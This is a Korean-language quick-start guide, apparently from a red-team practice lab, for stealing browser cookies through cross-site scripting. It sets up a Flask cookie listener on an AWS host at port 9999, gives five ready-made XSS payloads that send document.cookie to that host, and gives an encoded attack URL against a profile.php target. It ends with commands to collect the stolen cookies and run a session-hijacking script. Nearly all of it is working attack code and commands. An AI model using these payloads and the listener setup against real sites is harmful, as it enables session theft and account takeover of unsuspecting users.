# 빠른 시작 가이드 - 포트 9999

## 🚀 1단계: 리스너 서버 시작 (3.113.201.239)

### 한 줄 명령어 (복사해서 붙여넣기)

```bash
pip3 install flask --break-system-packages && \
chmod +x cookie_listener.py && \
nohup python3 cookie_listener.py > listener.log 2>&1 & \
sleep 2 && tail -f listener.log
```

### 출력 확인
```
🎯 Cookie Listener Server Started
📡 Listening on: http://0.0.0.0:9999
🔗 Webhook URL: http://3.113.201.239:9999/steal
```

**로그 종료**: `Ctrl + C` (서버는 백그라운드에서 계속 실행됨)

---

## 🔥 2단계: XSS 페이로드 (포트 9999)

### Top 5 페이로드 (바로 사용 가능)

#### 1️⃣ 슬래시 구분자 + fetch (가장 추천!)
```html
<img/src=x/onerror=fetch("http://3.113.201.239:9999/steal?c="+document.cookie)>
```

**브라우저 URL:**
```
http://3.34.90.201/profile.php?email=test@test&full_name=%3Cimg/src%3Dx/onerror%3Dfetch%28%22http%3A//3.113.201.239%3A9999/steal%3Fc%3D%22%2Bdocument.cookie%29%3E
```

#### 2️⃣ 슬래시 구분자 + new Image
```html
<img/src=x/onerror=new(Image).src="http://3.113.201.239:9999/steal?c="+document.cookie>
```

#### 3️⃣ details 태그
```html
<details/open/ontoggle=fetch("http://3.113.201.239:9999/steal?c="+document.cookie)>
```

#### 4️⃣ input autofocus
```html
<input/onfocus=fetch("http://3.113.201.239:9999/steal?c="+document.cookie)/autofocus>
```

#### 5️⃣ iframe javascript:
```html
<iframe/src="javascript:fetch('http://3.113.201.239:9999/steal?c='+document.cookie)">
```

---

## 🧪 3단계: 동작 확인

### 로컬에서 테스트
```bash
# 헬스체크
curl http://3.113.201.239:9999/health

# 예상 응답:
# {"status":"ok","message":"Cookie listener is running"}

# 쿠키 전송 테스트
curl "http://3.113.201.239:9999/steal?c=PHPSESSID=test123"
```

### 서버에서 로그 확인
```bash
# 실시간 로그 보기
tail -f listener.log

# 수집된 쿠키 확인
ls -lh stolen_cookies/
cat stolen_cookies/cookie_*.json
```

---

## ⚙️ AWS 보안 그룹 설정 (필수!)

포트 9999가 열려있는지 확인하세요:

```
AWS Console → EC2 → Security Groups → 해당 인스턴스 보안 그룹

Inbound Rules:
- Type: Custom TCP
- Port: 9999
- Source: 0.0.0.0/0
```

또는 서버에서:
```bash
# UFW 방화벽 확인
sudo ufw status

# 포트 9999 열기
sudo ufw allow 9999/tcp
```

---

## 🎯 전체 프로세스

```bash
# ============================================
# 로컬 PC에서
# ============================================
chmod 400 "$HOME/Downloads/A team.pem"
cd ~/Desktop/Red_basic_local/H/xss우회
scp -i "$HOME/Downloads/A team.pem" cookie_listener.py ubuntu@3.113.201.239:~/
ssh -i "$HOME/Downloads/A team.pem" ubuntu@3.113.201.239

# ============================================
# 서버(3.113.201.239)에서
# ============================================
pip3 install flask --break-system-packages && \
chmod +x cookie_listener.py && \
nohup python3 cookie_listener.py > listener.log 2>&1 & \
sleep 2 && tail -f listener.log

# Ctrl+C로 로그 종료 (서버는 백그라운드 실행 중)

# ============================================
# 로컬 PC 브라우저에서 테스트
# ============================================
# 아래 URL을 브라우저에 붙여넣기:
http://3.34.90.201/profile.php?email=test@test&full_name=%3Cimg/src%3Dx/onerror%3Dfetch%28%22http%3A//3.113.201.239%3A9999/steal%3Fc%3D%22%2Bdocument.cookie%29%3E

# ============================================
# 서버에서 쿠키 확인
# ============================================
tail -f listener.log
# 또는
cat stolen_cookies/cookie_*.json
```

---

## 🔄 리스너 제어

### 리스너 상태 확인
```bash
ps aux | grep cookie_listener
```

### 리스너 종료
```bash
pkill -f cookie_listener.py
# 또는
kill $(ps aux | grep cookie_listener.py | grep -v grep | awk '{print $2}')
```

### 리스너 재시작
```bash
pkill -f cookie_listener.py
nohup python3 cookie_listener.py > listener.log 2>&1 &
```

---

## 📊 쿠키 수집 후

### 로컬로 다운로드
```bash
# 서버에서 로컬로 쿠키 다운로드
scp -i "$HOME/Downloads/A team.pem" \
    ubuntu@3.113.201.239:~/stolen_cookies/*.json \
    ~/Desktop/Red_basic_local/H/xss우회/stolen_cookies/
```

### 세션 하이재킹
```bash
cd ~/Desktop/Red_basic_local/H/xss우회
python3 session_hijacker.py -t http://3.34.90.201/index.php
```

---

## 🚨 문제 해결

### 포트 9999가 여전히 사용 중
```bash
# 포트 사용 확인
sudo lsof -i :9999

# 프로세스 종료
sudo kill $(sudo lsof -t -i:9999)
```

### 외부에서 접근 안됨
```bash
# 1. 리스너가 실행 중인지 확인
ps aux | grep cookie_listener

# 2. 포트가 열려있는지 확인
sudo netstat -tuln | grep 9999
# 또는
sudo ss -tuln | grep 9999

# 3. 방화벽 확인
sudo ufw status
sudo ufw allow 9999/tcp

# 4. AWS 보안 그룹 확인 (콘솔에서)
```

---

**준비 완료! 즉시 테스트 가능합니다!** 🎯
